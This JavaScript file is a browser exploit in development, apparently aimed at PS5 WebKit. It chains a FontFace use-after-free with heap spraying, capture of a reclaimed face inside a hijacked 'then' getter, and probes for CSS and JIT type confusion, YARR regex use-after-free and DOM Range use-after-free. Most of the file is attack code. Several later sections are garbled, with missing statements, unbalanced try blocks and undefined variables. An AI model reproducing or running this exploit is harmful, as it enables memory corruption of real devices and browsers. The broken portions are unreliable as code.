"use strict";

// ============================================================
//  PS5 WebKit v14 - Capture Inside UAF Window
//
//  FROM RESEARCH REPORT:
//  1. CSS parser treats font URL as string without type check
//     → double interpreted as string pointer → memory leak
//  2. IsoHeaps isolate types → must spray SAME type
//  3. PS5 WebKit has no separate sandbox
//  4. FontFaceSet has tight reference counting
//  5. JIT needs >200 iterations for FTL compilation
//
//  KEY INSIGHT: load() returns RC face ONLY inside UAF window
//  We must capture the reference INSIDE the "then" getter!
// ============================================================

const O=document.getElementById("out");
const bp=document.getElementById("bp");
function bar(p){bp.style.width=p+"%"}
function hud(id,v){const e=document.getElementById(id);if(e)e.textContent=v}
function P(m,c){const s=document.createElement("span");if(c)s.className=c;
s.textContent=m+"\n";O.appendChild(s);O.scrollTop=O.scrollHeight;
try{console.log("[v14] "+m)}catch(e){}}
function Ok(m){P("✅ "+m,"ok")}function Fl(m){P("✘ "+m,"fl")}
function Wr(m){P("⚠ "+m,"wr")}function Hi(m){P("► "+m,"hi")}
function St(m){P("★ "+m+" ★","st")}function Dm(m){P(m,"dm")}
function Hd(m){P(m,"hd")}function Sep(){P("─".repeat(42),"dm")}

window.onerror=function(m,s,l){Fl("ERR: "+m+" @"+l)};

let keepAlive=[],holeFaces=[],reclaimFaces=[];
let uafTriggered=false,triggerFace=null;
let capturedRCFace=null,capturedRCIdx=-1;
let capturedInsideWindow=false;

const FB="d09GMgABAAAAAAJkAA4AAAAABiAAAAIQAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP0ZGVE0cGhwGYACCQggEEQgKcH0LCgABNgIkAxAEIAWEEAcyGy4FAI7Ctnlz5COJZMsihmWKh4f78Z573/0ZGIXRWLVZpRVNBz5LGmglcIJtH2hFs/L71vRPNg6FnRed2yOwAbJMJfRVCkhVAas6QCnP5701PYAm8AF8l8DegK66cR6mEGHAUS8K8ALFQCjz1m9GpK46tojEaUMI+PLzugVw1L1+g6Pdp10QoNuwKBKBQJW4q4V8mJ9xBx80vlmJDlJLBwDtADhxIz/D0Ya1YYmV/6ZePgIBgAmEBg1GEFgjBEZETYBSgpurYWj/ch78CyBaCUAkEgAQmj1O5W3E/1CCAu1o0I1+AIV5ERBV1dXSU+diLZ3nRV9OPep/9GPyZ/Ej398zrQyAl2Rh7bat/DBuWlu+rt026YeBG7HEWiTBtcafwuPKhODd1XFhmFr73R4rx+1LpKGZyEdolyDIR7hSoJlAAIAqpoBC8R6B0i5BIgS2SAC9niEApAChzzQCqc0uAo0ZFwhQ+vxCgBb9MYlAq744BSGqAxgjjBFIvVbQOKeKMuYfLSaEK7Yai2XguKmauX0HCg5t2NC0aubAChy/qmzUaj+jIBwDp8wtufXYHvxEVgIHtm05wG+yZ2mOGSQNC3Asy+sbTAq/FwbN6yCuJCftLedsSI0DzknNJsNUfOUqnng/9Fzes281/5JpNDqJaw3DWypomi41n5fDXAgJ/L/HCghqKARzIbLt1taqkzUt";
const FBb=(()=>{const s=atob(FB),b=new Uint8Array(s.length);
for(let i=0;i<s.length;i++)b[i]=s.charCodeAt(i);return b})();
function mkBuf(){const c=new Uint8Array(FBb.length);c.set(FBb);return c.buffer}

function fs(){void document.body.offsetTop;void document.documentElement.offsetHeight}
function addPads(n){const sh=document.getElementById("s").sheet;
for(let i=0;i<n;i++)sh.insertRule(
`@font-face{font-family:pad${i};src:url(np${i}.woff);unicode-range:U+E000}`,
sh.cssRules.length);fs()}
function addFlush(n){const st=document.createElement("style");st.id="flush";
document.head.appendChild(st);const sh=st.sheet;
for(let i=0;i<n;i++)sh.insertRule(
`@font-face{font-family:flush${i};src:url(nf${i}.woff);unicode-range:U+E000}`,
sh.cssRules.length);fs()}
function delFlush(){const e=document.getElementById("flush");
if(e&&e.sheet){while(e.sheet.cssRules.length)e.sheet.deleteRule(0);fs()}}
function killCk(){const f=new FontFace("ck"+keepAlive.length,"local(Helvetica)",
{unicodeRange:"U+E124"});document.fonts.add(f);keepAlive.push(f)}

// ============================================================
//  PHASE 1: UAF with CAPTURE INSIDE WINDOW
// ============================================================
function makeHoles(){
for(let i=0;i<4096;i++){const f=new FontFace("hole_"+i,mkBuf(),{
unicodeRange:"U+E1"+(i%16).toString(16),
style:i%2===0?"normal":"italic",
weight:String(100+(i%9)*100),
display:["auto","block","swap","fallback","optional"][i%5]});
document.fonts.add(f);holeFaces.push(f)}
fs();for(let i=1;i<holeFaces.length;i+=2)document.fonts.delete(holeFaces[i]);
fs();for(let i=0;i<4;i++){const t=[];for(let j=0;j<512;j++)t.push(new ArrayBuffer(4096))}
Ok("Holes")}

function spray(){
for(let i=0;i<4096;i++){const f=new FontFace("RC_"+i,mkBuf(),{
unicodeRange:"U+0041",style:"italic",weight:"900",display:"block"});
document.fonts.add(f);reclaimFaces.push(f)}fs();Ok("Spray")}

// ============================================================
//  PHASE 2: Capture + Test Inside UAF Window
//  The "then" getter fires DURING the font loading pipeline
//  At this moment, the CSSFontSelector is mid-operation
//  We must capture + test everything RIGHT HERE
// ============================================================
function setupTriggerWithCapture(){
triggerFace=new FontFace("trigger","local(Helvetica)",{unicodeRange:"U+0041"});
document.fonts.add(triggerFace);void triggerFace.loaded;
addPads(48);addFlush(768);

Hd("Setting up UAF with inside-window capture...");

Object.defineProperty(FontFace.prototype,"then",{
configurable:true,
get(){
if(this===triggerFace&&!uafTriggered){
uafTriggered=true;
hud("hU","UAF:✅");
St("UAF WINDOW OPEN — CAPTURING NOW");

// Step 1: Do the UAF
killCk();
document.getElementById("s").sheet.deleteRule(1);
fs();
delFlush();
for(let i=0;i<holeFaces.length;i+=4)
try{document.fonts.delete(holeFaces[i])}catch(e){}
fs();
for(let i=0;i<8;i++){const t=[];for(let j=0;j<256;j++)t.push(new ArrayBuffer(8192))}

// Step 2: Spray
spray();

// Step 3: CAPTURE — Try load() RIGHT NOW inside the window
Dm("Attempting load() inside UAF window...");
try{
// Synchronous check — does the selector see RC faces now?
const testFaces=document.fonts.load("1em trigger, x","AB");
// This returns a Promise, but we can check .status or
// synchronously iterate document.fonts

// Try synchronous property access on reclaim faces
let foundCount=0;
for(let i=0;i<Math.min(reclaimFaces.length,100);i++){
const f=reclaimFaces[i];
if(f.status==="loaded"){
foundCount++;
}
}
P("  Loaded RC faces (first 100): "+foundCount);
}catch(e){Fl("  Inside-window load error: "+e.message)}

// Step 4: Force style recalc with confused selector
fs();

// Step 5: Create divs that reference "x" family
// This forces the selector to resolve "x" while confused
for(let i=0;i<10;i++){
const d=document.createElement("div");
d.textContent="B";
d.style.cssText="position:absolute;left:-9999px;top:"+(i*30)+"px;font:64px x;";
document.body.appendChild(d);
}
fs();

Dm("UAF window operations complete");
}
return undefined;
}
});
}

// ============================================================
//  PHASE 3: Post-UAF Analysis
//  Check what we captured and test persistence
// ============================================================
async function postUAFAnalysis(){
Sep();Hd("POST-UAF ANALYSIS");Sep();

// Test 1: Does load() still return RC faces?

const f1=await document.fonts.load("1em trigger, x","AB");
P("  load('1em trigger, x','AB') → "+f1.length+" faces");
for(const f of f1){
P("    "+f.family+" "+f.style+" "+f.weight+" st="+f.status);
if(f.family&&f.family.startsWith("RC_")){
capturedRCFace=f;
const m=f.family.match(/RC_(\d+)/);
if(m)capturedRCIdx=parseInt(m[1]);
Hi("CAPTURED: "+f.family);
}
}

// Test 2: Try with just "x" family
P("");Dm("Test 2: load() for 'x' only");
const f2=await document.fonts.load("64px x","B");
P("  load('64px x','B') → "+f2.length+" faces");
for(const f of f2)P("    "+f.family+" "+f.style+" "+f.weight);

// Test 3: Check if any font is rendering "x" text
P("");Dm("Test 3: Check 'x' div rendering");
const xDivs=document.querySelectorAll('div[style*="font:64px x"]');
P("  Found "+xDivs.length+" x-divs");
for(const d of xDivs){
const w=d.offsetWidth;
P("  x-div width: "+w,w>0?"hi":"dm");
}

// Test 4: getComputedStyle for "x" elements
P("");Dm("Test 4: getComputedStyle for x-divs");
for(const d of xDivs){
try{
const cs=getComputedStyle(d);
P("  fontFamily: "+cs.fontFamily);
P("  fontWeight: "+cs.fontWeight);
P("  fontStyle:  "+cs.fontStyle);
}catch(e){}
break; // Just first one
}

// Test 5: Iterate document.fonts for anomalies
P("");Dm("Test 5: document.fonts anomalies");
let rcLoaded=0,rcError=0,rcUnloaded=0;
let loadedRCs=[];
for(const f of document.fonts){
if(f.family&&f.family.startsWith("RC_")){
if(f.status==="loaded"){rcLoaded++;loadedRCs.push(f.family)}
else if(f.status==="error")rcError++;
else rcUnloaded++;
}
}
P("  RC loaded: "+rcLoaded+" error: "+rcError+" unloaded: "+rcUnloaded);

// Show first few loaded RCs
if(loadedRCs.length>0&&loadedRCs.length<20){
Hi("Loaded RC faces: "+loadedRCs.join(", "));
}

// Test 6: Access captured face properties
if(capturedRCFace){
P("");Hd("CAPTURED FACE PROPERTIES:");
const props=["family","style","weight","stretch","unicodeRange",
"variant","featureSettings","display","status"];
for(const p of props){
try{P("  "+p.padEnd(16)+"= "+capturedRCFace[p])}catch(e){P("  "+p+"= ERR","fl")}
}
}

return capturedRCFace!==null;
}

// ============================================================
//  PHASE 4: CSS String/Double Type Confusion
//  From the research report:
//  "CSS parser assumed font URL was string without verifying
//   type, treating double as CSS string pointer → memory leak"
//
//  Try to trigger this by setting FontFace.src to unusual values
// ============================================================
async function cssTypeConfusion(){
Sep();Hd("CSS STRING/DOUBLE TYPE CONFUSION");Sep();

// Technique: Create FontFace with src that might be
// interpreted differently by the C++ parser vs JS engine

P("");Dm("Test 1: FontFace with numeric src");

1e308,1e-308,0.1,9007199254740991];

for(const src of numSrcs){
try{
const f=new FontFace("numtest",src,{unicodeRange:"U+0041"});
document.fonts.add(f);fs();
P("  src="+src+" → status="+f.status+" family="+f.family,
f.status!=="error"?"hi":"dm");

// If status is not "error", the parser accepted our numeric src!
// This might mean it interpreted the double's bits as a pointer
if(f.status!=="error"){
St("NUMERIC SRC ACCEPTED: "+src);
Hi("  This could be a type confusion!");
Hi("  The CSS parser might interpret double bits as string ptr!");
}

document.fonts.delete(f);fs();
}catch(e){
P("  src="+src+" → ERR: "+e.message.substring(0,50),"fl");
}
}

P("");Dm("Test 2: FontFace with object src");
const objSrcs=[
new Uint8Array(64),
new ArrayBuffer(64),
new DataView(new ArrayBuffer(64)),
{toString:()=>{return"local(Helvetica)"}},
[0x41,0x42,0x43],
/regex/,
null,
undefined
];

for(const src of objSrcs){

const f=new FontFace("objtest",src,{unicodeRange:"U+0041"});

P("  src=["+t+"] → status="+f.status,
f.status!=="error"?"hi":"dm");
if(f.status!=="error"){
Hi("OBJECT SRC ACCEPTED: "+t);
}
document.fonts.delete(f);fs();
}catch(e){
const t=typeof src;

}
}

// Technique 2: CSS @font-face rule with URL that's a number

const testURLs=[
"url(0)","url(1)","url(1.5)","url(0x41414141)",
"url(1e308)","url(NaN)","url(0.0.0.0)"
];

for(const url of testURLs){
try{

`@font-face{font-family:urltest;src:${url};unicode-range:U+E125}`,
sheet.cssRules.length);
fs();

// Check if the rule was accepted

// Try to read the src from the rule
try{
P("    rule.cssText: "+rule.cssText.substring(0,80));

}

sheet.deleteRule(idx);fs();
}catch(e){
P("  "+url+" → ERR: "+e.message.substring(0,40),"fl");
}
}

// Technique 3: Set FontFace.src after creation
P("");Dm("Test 4: Modify src after creation");
try{
const f=new FontFace("modsrc","local(Helvetica)",{unicodeRange:"U+0041"});
document.fonts.add(f);fs();

// Try setting src to unusual values
const modTests=[
"local(Courier)",  // Normal — should work
"0",               // Number as string
"1.5",             // Float as string
"",                // Empty
"undefined",       // String "undefined"
"url(0x41414141)"  // Hex URL

for(const newSrc of modTests){

f.status!=="error"?"hi":"dm");

P("  src→'"+newSrc+"' → ERR: "+e.message.substring(0,40),"fl");

// ============================================================
//  PHASE 5: JIT-Based Type Confusion
//  From report: "bugs require heating up JIT tiers, >200 iterations"
//  Try to trigger JIT speculation on FontFace properties
// ============================================================
async function jitTypeConfusion(){
Sep();Hd("JIT TYPE CONFUSION");Sep();

P("");Dm("Heating up JIT with FontFace property access...");

// Create many identical FontFace objects
const faces=[];
for(let i=0;i<500;i++){
const f=new FontFace("jit_"+i,mkBuf(),{
unicodeRange:"U+0041",style:"italic",weight:"900"});
document.fonts.add(f);faces.push(f);
}
fs();

// Access properties repeatedly to trigger JIT compilation
const results=[];
for(let iter=0;iter<300;iter++){
for(let i=0;i<faces.length;i++){
const f=faces[i];
const w=f.weight;
const s=f.style;
const fam=f.family;
if(w!=="900"||s!=="italic"||fam!=="jit_"+i){
results.push({iter,i,weight:w,style:s,family:fam});
if(results.length>=10)break;
}
}
if(results.length>=10)break;
}

if(results.length>0){
St("JIT TYPE CONFUSION DETECTED!");
for(const r of results){
Hi("  iter="+r.iter+" i="+r.i+" w="+r.weight+" s="+r.style+" fam="+r.family);
}
}else{
Dm("No JIT type confusion detected in "+faces.length+" faces x 300 iters");
}

// Cleanup
for(const f of faces)try{document.fonts.delete(f)}catch(e){}
fs();
}

// ============================================================
//  PHASE 6: Regex YARR UAF (from report)
//  YARR backtracking can cause UAF in ParenContext
// ============================================================
async function regexYARRExploit(){
Sep();Hd("REGEX YARR UAF ATTEMPT");Sep();

P("");Dm("Testing YARR regex backtracking patterns...");

const patterns=[
/(a+)+b/,           // Classic ReDoS
/(a|a)+b/,          // Alternation
/((a+)+)+b/,        // Nested quantifiers
/(a*)*b/,           // Star nesting
/(?:a+)+b/,         // Non-capturing
/(a+)+$/            // Anchored
];

for(const pat of patterns){
try{
const t0=performance.now();
// Try to trigger backtracking
const result=pat.exec("a".repeat(30));
const elapsed=performance.now()-t0;
P("  "+pat.source.padEnd(20)+" → "+elapsed.toFixed(1)+"ms",
elapsed>100?"hi":"dm");
}catch(e){
P("  "+pat.source.padEnd(20)+" → ERR: "+e.message.substring(0,40),"fl");
}
}

// Try with JIT compilation (>200 iterations)
P("");Dm("Heating up regex JIT...");
const hotPat=/(a+)+b/;
const hotStr="a".repeat(25)+"c"; // Will fail, causing backtracking

for(let i=0;i<300;i++){
try{hotPat.exec(hotStr)}catch(e){}
}

const t0=performance.now();
hotPat.exec(hotStr);
const elapsed=performance.now()-t0;
P("  After JIT: "+elapsed.toFixed(1)+"ms");

// Try patterns that might cause crashes
P("");Dm("Testing crash-inducing patterns...");
const crashPats=[
new RegExp("(".repeat(50)+"a"+")".repeat(50)),
/(a{1,1000000}){1,1000000}/,
/((?:a+)+)+$/
];

for(const pat of crashPats){
try{
pat.exec("a".repeat(20));
P("  Pattern survived","ok");
}catch(e){
P("  Pattern error: "+e.message.substring(0,50),"fl");
}
}
}

// ============================================================
//  PHASE 7: DOM Range UAF (from report)
// ============================================================
async function domRangeUAF(){
Sep();Hd("DOM RANGE UAF");Sep();

P("");Dm("Testing DOM Range endpoint abuse...");

try{
const range=document.createRange();
const container=document.createElement("div");
container.innerHTML="<p>text<span>more</span></p>";
document.body.appendChild(container);

const p=container.querySelector("p");
const span=container.querySelector("span");

range.setStart(p,0);
range.setEnd(span,1);

// Try to create UAF by removing nodes during range use
const text=range.toString();
P("  Range text: "+text);

// Remove the span while range references it
container.removeChild(span);

// Try to use the range again
try{
const text2=range.toString();
P("  After removal: "+text2,text2!==text?"hi":"dm");
}catch(e){
P("  Range access after removal: "+e.message,"fl");
}

document.body.removeChild(container);
}catch(e){Fl("  "+e.message)}
}
